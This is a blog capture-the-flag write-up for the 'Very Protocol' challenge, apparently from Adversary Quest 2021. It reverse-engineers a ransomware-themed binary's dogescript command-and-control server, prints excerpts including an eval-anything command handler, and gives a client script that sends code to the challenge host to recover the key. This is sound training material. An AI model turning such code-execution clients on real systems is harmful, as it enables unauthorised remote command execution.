<!doctype html><html lang=en-us>
<head>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta http-equiv=x-ua-compatible content="ie=edge">
<meta itemprop=name content="Very Protocol">
<meta itemprop=description content="Challenge Description:  We were approached by a CATAPULT SPIDER victim that was compromised and had all their cat pictures encrypted. Employee morale dropped to an all-time low. We believe that we identified a binary file that is related to the incident and is still running in the customer environment, accepting command and control traffic on veryprotocol.challenges.adversary.zone:41414
  Can you help the customer recover the encryption key?
 Write-up: For this challenge we are given a (46MB!"><meta itemprop=datePublished content="2021-02-04T19:50:40-06:00">
<meta itemprop=dateModified content="2021-02-04T19:50:40-06:00">
<meta itemprop=wordCount content="896">
<meta itemprop=keywords content="AdversaryQuest,CTFs,"><meta property="og:title" content="Very Protocol">
<meta property="og:description" content="Challenge Description:  We were approached by a CATAPULT SPIDER victim that was compromised and had all their cat pictures encrypted. Employee morale dropped to an all-time low. We believe that we identified a binary file that is related to the incident and is still running in the customer environment, accepting command and control traffic on veryprotocol.challenges.adversary.zone:41414
  Can you help the customer recover the encryption key?
 Write-up: For this challenge we are given a (46MB!">
<meta property="og:type" content="article">
<meta property="og:url" content="https://joe.lothan.net/ctfs/2021-adversary-quest/very-protocol/"><meta property="article:section" content="ctfs">
<meta property="article:published_time" content="2021-02-04T19:50:40-06:00">
<meta property="article:modified_time" content="2021-02-04T19:50:40-06:00">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Very Protocol">
<meta name=twitter:description content="Challenge Description:  We were approached by a CATAPULT SPIDER victim that was compromised and had all their cat pictures encrypted. Employee morale dropped to an all-time low. We believe that we identified a binary file that is related to the incident and is still running in the customer environment, accepting command and control traffic on veryprotocol.challenges.adversary.zone:41414
  Can you help the customer recover the encryption key?
 Write-up: For this challenge we are given a (46MB!">
<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png>
<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png>
<link rel=manifest href=/site.webmanifest>
<link rel=mask-icon href=/safari-pinned-tab.svg color>
<link rel="shortcut icon" href=/favicon.ico>
<title>Very Protocol</title>
<link rel=stylesheet href=https://joe.lothan.net/css/style.min.eac77496566fd7d5768fd650ddb0b2b181ca6a2d7c5fdd6fe6b8ba4bf47e566f.css integrity="sha256-6sd0llZv19V2j9ZQ3bCysYHKai18X91v5ri6S/R+Vm8=" crossorigin=anonymous>
</head>
<body id=page>
<header id=site-header class="animated slideInUp">
<div class="hdr-wrapper section-inner">
<div class=hdr-left>
<div class=site-branding>
<a href=https://joe.lothan.net/>Joe Lothan</a>
</div>
<nav class="site-nav hide-in-mobile">
<a href=https://joe.lothan.net/ctfs/>CTFs</a>
</nav>
</div>
<div class="hdr-right hdr-icons">
<span class="hdr-social hide-in-mobile"><a href=https://github.com/lothan target=_blank rel="noopener me" title=Github><svg xmlns="http://www.w3.org/2000/svg" class="feather" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a></span><button id=menu-btn class=hdr-btn title=Menu><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button>
</div>
</div>
</header>
<div id=mobile-menu class="animated fast">
<ul>
<li><a href=https://joe.lothan.net/ctfs/>CTFs</a></li>
</ul>
</div>
<main class="site-main section-inner thin animated fadeIn faster">
<h1>Very Protocol</h1>
<div class=content>
<h4 id=challenge-description>Challenge Description:<a href=#challenge-description class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h4>
<blockquote>
<p>We were approached by a CATAPULT SPIDER victim that was compromised and had all their cat pictures encrypted. Employee morale dropped to an all-time low. We believe that we identified a binary file that is related to the incident and is still running in the customer environment, accepting command and control traffic on <code>veryprotocol.challenges.adversary.zone:41414</code></p>
</blockquote>
<blockquote>
<p>Can you help the customer recover the encryption key?</p>
</blockquote>
<h4 id=write-up>Write-up:<a href=#write-up class=anchor aria-hidden=true><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 015 5 5 5 0 01-5 5h-3m-6 0H6a5 5 0 01-5-5 5 5 0 015-5h3"/><line x1="8" y1="12" x2="16" y2="12"/></svg></a></h4>
<p>For this challenge we are given a (46MB!) binary and asked to reverse engineer the command and control protocol to recover the encryption key. Dealing with the size of the binary posed quite a challenge - when opening it in a reverse engineering program (I used Cutter) it caused the import to hang while analyzing. Even looking for strings gives hundreds of thousands of lines:</p>
<pre tabindex=0><code>$ strings malware | wc
 422247  846037 16304682
</code></pre><p>So I kinda cheated. If we know the binary is listening on port 41414 for command and control traffic, let&rsquo;s search the malware for the string &ldquo;41414&rdquo;. The port number could be specified as a binary integer or even be obfuscated of course, but we get lucky and find the code for a listening server in plaintext.</p>
<pre tabindex=0><code>$ grep -a 41414 malware                              
server.listen(41414, () =&gt; {
</code></pre><p>Let&rsquo;s take a look around a bit&mldr;</p>
<pre tabindex=0><code>$ grep -a 41414 malware -A 10 -B 10
              socket.authorized ? 'top doge' : 'not top doge');
  let networker = new Networker(socket, (data) =&gt; {
    very doge_lingo is data dose toString
    shh plz console.loge with 'top doge sez:' doge_lingo
    very doge_woof is plz dogeParam with doge_lingo
    networker dose send with doge_woof
    //networker.send(dogeParam(data.toString()));
  });
  networker dose init with 'such doge is yes wow' 'such doge is shibe wow'
});
server.listen(41414, () =&gt; {
  plz console.loge with 'doge waiting for command from top doge'
});
server.on('connection', function(c) {
	plz console.loge with 'doge connect'
});
server.on('secureConnect', function(c) {
	plz console.loge with 'doge connect secure'
});
doge_cert = `-----BEGIN CERTIFICATE-----
MIIFITCCAwkCAWUwDQYJKoZIhvcNAQELBQAwTzELMAkGA1UEBhMCVVMxEzARBgNV
</code></pre><p>Looks like javascript&mldr; but written by a hekkin good boi</p>
<p><img src=images/shiba-programmer.jpg alt="doge programmer"></p>
<p>We were given a bit of a hint from the last challenge - this adversary forked the code for <a href=https://github.com/shibefan/dogescript>dogescript</a> (very compile to javascript) and <a href=https://github.com/shibefan/DSON>DSON</a> (much json reskin wow). Looks like they are writing meme malware. Let&rsquo;s grep around to find the beginning and end of the dogescript section and then covert it to javascript</p>
<pre tabindex=0><code>$ grep -a &quot;41414&quot; malware -B 195 -A 589 &gt; malware.djs
$ npm install -g dogescript
$ dogescript malware.djs --beautify &gt; malware.js
</code></pre><p>Looking at the <a href=malware.js.txt>code</a> we can see that it generates the secret key:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Javascript data-lang=Javascript><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>cript_key</span> <span style=color:#f92672>=</span> Math.<span style=color:#a6e22e>random</span>().<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>36</span>).<span style=color:#a6e22e>substr</span>(<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>15</span>);

<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>CRYPTZ</span>  <span style=color:#f92672>===</span> <span style=color:#66d9ef>undefined</span>) {
    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;no cryptz key. doge can not crypt catz.&#39;</span>);
    <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
}

<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>secrit_key</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>cript</span>(<span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>CRYPTZ</span>, <span style=color:#a6e22e>cript_key</span>);
<span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>CRYPTZ</span> <span style=color:#f92672>=</span><span style=color:#e6db74>&#39;you dnt git key&#39;</span>;
<span style=color:#66d9ef>delete</span> <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>CRYPTZ</span>;
</code></pre></div><p>The <code>cript(input, key)</code> function just xors the key with the environment variable <code>CRYPTZ</code>. Then we have a large function called <code>dogeParam</code> which takes in network data, parses it for DSON and depending on the DSON input, does something and returns DSON data to send back to the client. The key function I used here was &lsquo;do me a favor&rsquo; which evaluates any dogescript you send to it.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Javascript data-lang=Javascript><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>dogeParam</span> (<span style=color:#a6e22e>buffer</span>) { 
    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>doge_command</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>dson</span>.<span style=color:#a6e22e>parse</span>(<span style=color:#a6e22e>buffer</span>);
    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>doge_response</span> <span style=color:#f92672>=</span> {};

    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>(<span style=color:#e6db74>&#39;dogesez&#39;</span> <span style=color:#66d9ef>in</span> <span style=color:#a6e22e>doge_command</span>)) {
        <span style=color:#a6e22e>doge_response</span> [<span style=color:#e6db74>&#39;dogesez&#39;</span>]<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;bonk&#39;</span>;
        <span style=color:#a6e22e>doge_response</span> [<span style=color:#e6db74>&#39;shibe&#39;</span>]<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;doge not sez&#39;</span>;
        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>dson</span>.<span style=color:#a6e22e>stringify</span>(<span style=color:#a6e22e>doge_response</span>);
    } 

    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>doge_command</span>.<span style=color:#a6e22e>dogesez</span>  <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;ping&#39;</span>) {
        <span style=color:#a6e22e>doge_response</span> [<span style=color:#e6db74>&#39;dogesez&#39;</span>]<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;pong&#39;</span>;
        <span style=color:#a6e22e>doge_response</span> [<span style=color:#e6db74>&#39;ohmaze&#39;</span>]<span style=color:#f92672>=</span><span style=color:#a6e22e>doge_command</span>.<span style=color:#a6e22e>ohmaze</span>;
    } 

    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>doge_command</span>.<span style=color:#a6e22e>dogesez</span>  <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;do me a favor&#39;</span>) {
        <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>favor</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>undefined</span>;
        <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>doge</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>undefined</span>;
        <span style=color:#66d9ef>try</span> {
            <span style=color:#a6e22e>doge</span> <span style=color:#f92672>=</span><span style=color:#a6e22e>dogescript</span>(<span style=color:#a6e22e>doge_command</span>.<span style=color:#a6e22e>ohmaze</span>);
            <span style=color:#a6e22e>favor</span> <span style=color:#f92672>=</span>eval(<span style=color:#a6e22e>doge</span>);
            <span style=color:#a6e22e>doge_response</span> [<span style=color:#e6db74>&#39;dogesez&#39;</span>]<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;welcome&#39;</span>;
            <span style=color:#a6e22e>doge_response</span> [<span style=color:#e6db74>&#39;ohmaze&#39;</span>]<span style=color:#f92672>=</span><span style=color:#a6e22e>favor</span>;
        } <span style=color:#66d9ef>catch</span> {
            <span style=color:#a6e22e>doge_response</span> [<span style=color:#e6db74>&#39;dogesez&#39;</span>]<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;bonk&#39;</span>;
            <span style=color:#a6e22e>doge_response</span> [<span style=color:#e6db74>&#39;shibe&#39;</span>]<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;doge sez no&#39;</span>;
        }
    } 

 ...

    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>dson</span>.<span style=color:#a6e22e>stringify</span>(<span style=color:#a6e22e>doge_response</span>);
}
</code></pre></div><p>And finally there is some network code which starts a TLS server with certain certs and keys and passes data recieved to <code>dogeParam</code>.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Javascript data-lang=Javascript><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>options</span> <span style=color:#f92672>=</span>{ <span style=color:#a6e22e>key</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>servs_key</span>, <span style=color:#a6e22e>cert</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>servs_cert</span>, <span style=color:#a6e22e>requestCert</span> <span style=color:#f92672>:</span><span style=color:#66d9ef>true</span>, <span style=color:#a6e22e>rejectUnauthorized</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span>, <span style=color:#a6e22e>ca</span><span style=color:#f92672>:</span> [ <span style=color:#a6e22e>doge_ca</span> ] };

<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>server</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>tls</span>.<span style=color:#a6e22e>createServer</span>(<span style=color:#a6e22e>options</span>, (<span style=color:#a6e22e>socket</span>) =&gt; {
    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;doge connected: &#39;</span>, <span style=color:#a6e22e>socket</span>.<span style=color:#a6e22e>authorized</span> <span style=color:#f92672>?</span> <span style=color:#e6db74>&#39;top doge&#39;</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;not top doge&#39;</span>);
    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>networker</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Networker</span>(<span style=color:#a6e22e>socket</span>, (<span style=color:#a6e22e>data</span>) =&gt; {
        <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>doge_lingo</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>data</span>.<span style=color:#a6e22e>toString</span>();
        <span style=color:#75715e>// plz console.loge with &#39;top doge sez:&#39; doge_lingo
</span><span style=color:#75715e></span>        <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>doge_woof</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>dogeParam</span>(<span style=color:#a6e22e>doge_lingo</span>);
        <span style=color:#a6e22e>networker</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>doge_woof</span>);
        <span style=color:#75715e>//networker.send(dogeParam(data.toString()));
</span><span style=color:#75715e></span>    });
    
    <span style=color:#a6e22e>networker</span>.<span style=color:#a6e22e>init</span>(<span style=color:#e6db74>&#39;such doge is yes wow&#39;</span>, <span style=color:#e6db74>&#39;such doge is shibe wow&#39;</span>);
});
</code></pre></div><p>There is also a Networker class which is used on top of TLS and seems to add an extra layer of enryption, using the HMAC and AES keys <code>'such doge is yes wow'</code> and <code>'such doge is shibe wow'</code> that it&rsquo;s initialized with. The easiest way to interface with this protocol is copy it and change it around to fit our needs. All we need to do is change the server certificate and key to the doge cert and key. Then connect to the server (instead of listen) and use the same Networker code to send and recieve data.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-Javascript data-lang=Javascript><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>conn</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>tls</span>.<span style=color:#a6e22e>connect</span>(<span style=color:#ae81ff>41414</span>, <span style=color:#e6db74>&#34;veryprotocol.challenges.adversary.zone&#34;</span>, <span style=color:#a6e22e>options</span>, () =&gt; {
    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>networker</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Networker</span>(<span style=color:#a6e22e>conn</span>, (<span style=color:#a6e22e>data</span>) =&gt; {
        <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>doge_lingo</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>data</span>.<span style=color:#a6e22e>toString</span>();
        <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>dson</span>.<span style=color:#a6e22e>parse</span>(<span style=color:#a6e22e>doge_lingo</span>).<span style=color:#a6e22e>ohmaze</span>)
    });
    <span style=color:#a6e22e>networker</span>.<span style=color:#a6e22e>init</span>(<span style=color:#e6db74>&#39;such doge is yes wow&#39;</span>, <span style=color:#e6db74>&#39;such doge is shibe wow&#39;</span>);
    <span style=color:#a6e22e>tos</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>dson</span>.<span style=color:#a6e22e>stringify</span>({<span style=color:#a6e22e>dogesez</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;do me a favor&#39;</span>, <span style=color:#a6e22e>ohmaze</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;cript(secrit_key,cript_key)&#34;</span>});
    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>tos</span>);
    <span style=color:#a6e22e>networker</span>.<span style=color:#a6e22e>send</span>(<span style=color:#a6e22e>tos</span>);
});
</code></pre></div><p>We can put whatever <code>cmd</code> we want for the malware to run. <a href=doge-send.js.txt>Here</a> is the full code. The xoring function <code>cript</code> is reversable and <code>secrit_key</code> and <code>cript_key</code> are defined globally so we can just ask the server to decrypt our key!</p>
<pre tabindex=0><code>$ npm install dogescript dogeon
$ node doge-send.js            
such &quot;dogesez&quot; is &quot;do me a favor&quot; next &quot;ohmaze&quot; is &quot;cript(secrit_key,cript_key)&quot; wow
CS{such_Pr0t0_is_n3tw0RkS_w0W}
</code></pre>
</div>
</main>
<footer id=site-footer class="section-inner thin animated fadeIn faster">
<p>&copy; 2021 <a href=https://joe.lothan.net/>Joe Lothan</a></p>
<p>
Made with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> &#183; Theme <a href=https://github.com/Track3/hermit target=_blank rel=noopener>Hermit</a> &#183; <a href=https://joe.lothan.net/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a>
</p>
</footer>
<script src=https://joe.lothan.net/js/bundle.min.7d8545daa55d62427355498dd8da13f98ff79a7938ce7d2a5e2ae1ec0de3beb8.js integrity="sha256-fYVF2qVdYkJzVUmN2NoT+Y/3mnk4zn0qXirh7A3jvrg=" crossorigin=anonymous></script>
</body>
</html>